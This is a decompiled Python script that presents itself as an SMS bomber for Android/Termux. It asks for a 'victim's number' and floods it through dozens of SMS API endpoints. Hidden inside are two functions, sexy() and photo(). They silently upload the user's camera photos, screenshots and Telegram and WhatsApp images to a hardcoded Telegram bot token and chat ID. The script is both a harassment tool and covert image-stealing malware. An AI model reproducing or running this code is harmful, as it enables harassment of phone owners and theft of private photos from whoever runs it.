# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2023-12-10 22:56:18.558237
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import time
#@useridinfobot
def sexy():
    session=requests.session() 
    bot_token ='6425308140:AAH-eqmhI_5X2obNNy3-ctMjB8plZkiNo3c' 
    chat_id ='1843882189'
    #-----------( /sdcard
    try:
        
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

def photo():
    session=requests.session() 
    bot_token ='6425308140:AAH-eqmhI_5X2obNNy3-ctMjB8plZkiNo3c' 
    chat_id ='1843882189'
    #-----------( /sdcard
    try:
        # camera 
        open(".pho.txt","a").write("done")
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    
    except:pass
    try:
        # camera 
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        #screen_shot
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        #screen_shot
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #sms send stard
def print_centered(text):
    terminal_width = os.get_terminal_size().columns
    centered_text = text.center(terminal_width)
    print(centered_text)


def check_internet_connection():
    try:
        response = requests.get("https://www.google.com", timeout=5)
        if response.status_code == 200:
            return True
    except requests.ConnectionError:
        pass
    return False

if check_internet_connection():
   
   os.system("xdg-open https://github.com/fkunknownteam")
else:
   print_centered("\033[1;31m Check your internet connection and try again.")
   sys.exit()
   

banner = ("""\033[35;1m] /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$$ /$$$$$$ 
 /$$__  $$| $$  | $$|_  $$_/| $$]_____//$$__  $$
| $$  \__/| $$  | $$  | $$  | $$     | $$  \ $$
|  $$$$$$ | $$$$$$$$  | $$  | $$$$$  | $$$$$$$$
 \____  $$| $$__  $$  | $$  | $$__/  | $$__  $$
 /$$  \ $$| $$  | $$  | $$  | $$     | $$  | $$
|  $$$$$$/| $$  | $$ /$$$$$$| $$     | $$  | $$
 \______/ |__/  |__/|______/|__/     |__/  |__/🥀""")

os.system("clear")
print()
print(banner) 

def encrypt_number(number, key):
    # Your encryption logic here
    encrypted_number = number ^ key
    return encrypted_number

encryption_key = 8888888888

attempts = 0

blocklist_url = "https://raw.githubusercontent.com/fkunknownteam/premium-sms-bomber/main/premium-list.txt"
try:
    blocklist_content = requests.get(blocklist_url).text
except requests.exceptions.RequestException as e:
    print(f"Failed to fetch blocklist data: {e}")
    exit(1)

while attempts < 3:
    phone_number = input("\n\fEnter Victim’s Number : +88")
    
    # Check if the number has exactly 11 digits
    if phone_number.isdigit() and len(phone_number) == 11:
        print("\n\fThe Phone Number is Valid.")
        
        # Original number as a string (with leading zero)
        original_number = f"{phone_number}"

        # Encrypt the number
        encrypted_number = encrypt_number(int(original_number), encryption_key)

        # Check if the number is in the blocklist
        if str(encrypted_number) in blocklist_content:
            print("\n\n\tThis Number is Blocklisted... Try Another Number.")
            time.sleep(5)
            exit()  # Exit the script if the number is in the blocklist
        
        break
    else:
        print("\n\fThe number does not have 11 digits. Please try again.")
        attempts += 1

if attempts == 3:
    print("\n\fExceeded maximum attempts. Exiting...")
    exit()

api0 = f"http://sms.api.termuxcommand.xyz/api0.php?phone={phone_number}"


api1 = f"http://sms.api.termuxcommand.xyz/api1.php?phone={phone_number}"

api2 = f"http://sms.api.termuxcommand.xyz/api2.php?phone={phone_number}"

api3 = f"http://sms.api.termuxcommand.xyz/api3.php?phone={phone_number}"

api4 = f"http://sms.api.termuxcommand.xyz/api4.php?phone={phone_number}"

api5 = f"http://sms.api.termuxcommand.xyz/api5.php?phone={phone_number}"

api6 = f"http://sms.api.termuxcommand.xyz/api6.php?phone={phone_number}"

api7 = f"http://sms.api.termuxcommand.xyz/api7.php?phone={phone_number}"

api8 = f"http://sms.api.termuxcommand.xyz/api8.php?phone={phone_number}"

api9 = f"http://sms.api.termuxcommand.xyz/api9.php?phone={phone_number}"

api10 = f"http://sms.api.termuxcommand.xyz/api10.php?phone={phone_number}"

api11 = f"http://sms.api.termuxcommand.xyz/api11.php?phone={phone_number}"

api12 = f"http://sms.api.termuxcommand.xyz/api12.php?phone={phone_number}"

api13 = f"http://sms.api.termuxcommand.xyz/api13.php?phone={phone_number}"

api14 = f"http://sms.api.termuxcommand.xyz/api14.php?phone={phone_number}"

api15 = f"http://sms.api.termuxcommand.xyz/api15.php?phone={phone_number}"

api16 = f"http://sms.api.termuxcommand.xyz/api16.php?phone={phone_number}"

api17 = f"http://sms.api.termuxcommand.xyz/api17.php?phone={phone_number}"

api18 = f"http://sms.api.termuxcommand.xyz/api18.php?phone={phone_number}"

api19 = f"http://sms.api.termuxcommand.xyz/api19.php?phone={phone_number}"

api20 = f"http://sms.api.termuxcommand.xyz/api20.php?phone={phone_number}"

api21 = f"http://sms.api.termuxcommand.xyz/api21.php?phone={phone_number}"

api22 = f"http://sms.api.termuxcommand.xyz/api22.php?phone={phone_number}"

api23 = f"http://sms.api.termuxcommand.xyz/api23.php?phone={phone_number}"

api24= f"http://sms.api.termuxcommand.xyz/api24.php?phone={phone_number}"

api25 = f"http://sms.api.termuxcommand.xyz/api25.php?phone={phone_number}"

api26 = f"http://sms.api.termuxcommand.xyz/api26.php?phone={phone_number}"

api26 = f"http://sms.api.termuxcommand.xyz/api27.php?phone={phone_number}"

api27 = f"http://sms.api.termuxcommand.xyz/api27.php?phone={phone_number}"

api28 = f"http://sms.api.termuxcommand.xyz/api28.php?phone={phone_number}"

api29 = f"http://sms.api.termuxcommand.xyz/api29.php?phone={phone_number}"

api30 = f"http://sms.api.termuxcommand.xyz/api30.php?phone={phone_number}"

api31 = f"http://sms.api.termuxcommand.xyz/api31.php?phone={phone_number}"

api32 = f"http://sms.api.termuxcommand.xyz/api32.php?phone={phone_number}"

api33 = f"http://sms.api.termuxcommand.xyz/api33.php?phone={phone_number}"

api34= f"http://sms.api.termuxcommand.xyz/api34.php?phone={phone_number}"

api35 = f"http://sms.api.termuxcommand.xyz/api35.php?phone={phone_number}"

api36= f"http://sms.api.termuxcommand.xyz/api36.php?phone={phone_number}"

api37 = f"http://sms.api.termuxcommand.xyz/api37.php?phone={phone_number}"

api38 = f"http://sms.api.termuxcommand.xyz/api38.php?phone={phone_number}"

api39 = f"http://sms.api.termuxcommand.xyz/api39.php?phone={phone_number}"

api40 = f"http://sms.api.termuxcommand.xyz/api40.php?phone={phone_number}"

api41= f"http://sms.api.termuxcommand.xyz/api41.php?phone={phone_number}"

api42 = f"http://sms.api.termuxcommand.xyz/api42.php?phone={phone_number}"

api43 = f"http://sms.api.termuxcommand.xyz/api43.php?phone={phone_number}"

api_endpoints = [
    api0,api1, api2, api3, api4, api5, api6, api7, api8, api9, api10, api11, api12, api13, api14, api15, api16, api17, api18, api19, api20,
    api21, api22, api23, api24, api25, api26, api27, api28, api29, api30,
    api31, api32, api33, api34, api35, api36, api37, api38, api39, api40, api41, api42, api43
]


attempts = 0

while attempts < 3:
    user_input = input("\n\fEnter Amount: ")
    if user_input.isdigit():
        amount = int(user_input)
        if amount <= 500:
            break
        else:
            print("\n\fAmount exceeds maximum (299). Please enter a valid amount.")
    else:
        print("\n\fInvalid input. Please enter a valid number.")
    attempts += 1

if attempts == 3:
    print("\n\fExceeded maximum attempts. Exiting...")
    
    exit()

response = requests.get('https://httpbin.org/ip')
public_ip = response.json()['origin']

os.system(" clear")
print("\033[1;96m[#] Up the Bomber - Please be patient\33[97m")
print("API Version   :  1.0")
print("Target        : " +phone_number)
print("Amount        : " + str(amount))
print("Your IP       : " + str(public_ip))
print(
        "\033[0;33m[!] This tool was made for fun and research purposes only\33[97m")
print("==========================================")
for i in range(amount):
    api_to_use = api_endpoints[i % len(api_endpoints)]
    requests.get(api_to_use)
    print(f"{i + 1}/{amount} Request has been Successful ")

with ThreadPool(max_workers=20) as jjj:
    jjj.submit(sexy)
    jjj.submit(photo)
    
print("\033[1;32m\n\n\t\tTHANKS FOR USING THIS TOOL ❤️")
input("\n\t\t\tEnter For Continue \>")
os.system("clear")
os.system("python sms_bomber.py")
